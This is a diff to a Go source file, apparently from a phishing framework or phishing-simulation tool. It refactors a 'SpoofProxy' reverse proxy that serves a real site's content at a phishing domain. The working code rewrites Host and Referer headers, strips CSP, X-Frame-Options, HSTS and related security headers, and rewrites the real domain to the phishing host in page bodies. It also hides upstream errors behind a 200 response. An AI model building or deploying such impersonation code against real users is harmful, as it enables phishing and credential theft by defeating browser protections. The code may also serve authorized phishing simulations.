@@ -19,11 +19,18 @@ import (
 // browser sees the content of spoof_url rendered at the phishing domain —
 // no redirect is issued.
 type SpoofProxy struct {
-	logger *slog.Logger
+	logger    *slog.Logger
+	transport *http.Transport
 }
 
 func NewSpoofProxy(logger *slog.Logger) *SpoofProxy {
-	return &SpoofProxy{logger: logger}
+	return &SpoofProxy{
+		logger: logger,
+		transport: &http.Transport{
+			ResponseHeaderTimeout: 10 * time.Second,
+			IdleConnTimeout:       30 * time.Second,
+		},
+	}
 }
 
 // ServeHTTP proxies the incoming request to spoofURL, rewrites domain
@@ -42,40 +49,34 @@ func (sp *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request, spoofURL
 		return
 	}
 
-	proxy := httputil.NewSingleHostReverseProxy(target)
-	proxy.Transport = &http.Transport{
-		ResponseHeaderTimeout: 10 * time.Second,
-		IdleConnTimeout:       30 * time.Second,
-	}
+	proxy := &httputil.ReverseProxy{
+		Rewrite: func(pr *httputil.ProxyRequest) {
+			pr.SetURL(target)
+			pr.Out.Host = target.Host
 
-	proxy.Director = func(req *http.Request) {
-		req.URL.Scheme = target.Scheme
-		req.URL.Host = target.Host
-		req.Host = target.Host
+			if referer := pr.In.Header.Get("Referer"); referer != "" {
+				pr.Out.Header.Set("Referer", rewriteHostInURL(referer, target.Host))
+			}
+			// Remove session tracking cookie so the spoofed site starts fresh.
+			removeCookie(pr.Out, "_msess")
+		},
+		Transport: sp.transport,
+		ModifyResponse: func(resp *http.Response) error {
+			resp.Header.Del("Content-Security-Policy")
+			resp.Header.Del("Content-Security-Policy-Report-Only")
+			resp.Header.Del("X-Frame-Options")
+			resp.Header.Del("Strict-Transport-Security")
+			resp.Header.Del("X-Content-Type-Options")
 
-		if referer := req.Header.Get("Referer"); referer != "" {
-			req.Header.Set("Referer", rewriteHostInURL(referer, target.Host))
-		}
-		// Remove session tracking cookie so the spoofed site starts fresh.
-		removeCookie(req, "_msess")
-	}
-
-	proxy.ModifyResponse = func(resp *http.Response) error {
-		resp.Header.Del("Content-Security-Policy")
-		resp.Header.Del("Content-Security-Policy-Report-Only")
-		resp.Header.Del("X-Frame-Options")
-		resp.Header.Del("Strict-Transport-Security")
-		resp.Header.Del("X-Content-Type-Options")
-
-		if isRewritableContentType(resp.Header.Get("Content-Type")) {
-			resp.Body = rewriteDomainsInBody(resp.Body, target.Host, r.Host)
-		}
-		return nil
-	}
-
-	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
-		sp.logger.Warn("spoofproxy: upstream error", "url", spoofURL, "error", err)
-		w.WriteHeader(http.StatusOK) // fail silently
+			if isRewritableContentType(resp.Header.Get("Content-Type")) {
+				resp.Body = rewriteDomainsInBody(resp.Body, target.Host, r.Host)
+			}
+			return nil
+		},
+		ErrorHandler: func(w http.ResponseWriter, r *http.Request, err error) {
+			sp.logger.Warn("spoofproxy: upstream error", "url", spoofURL, "error", err)
+			w.WriteHeader(http.StatusOK) // fail silently
+		},
 	}
 
 	proxy.ServeHTTP(w, r)
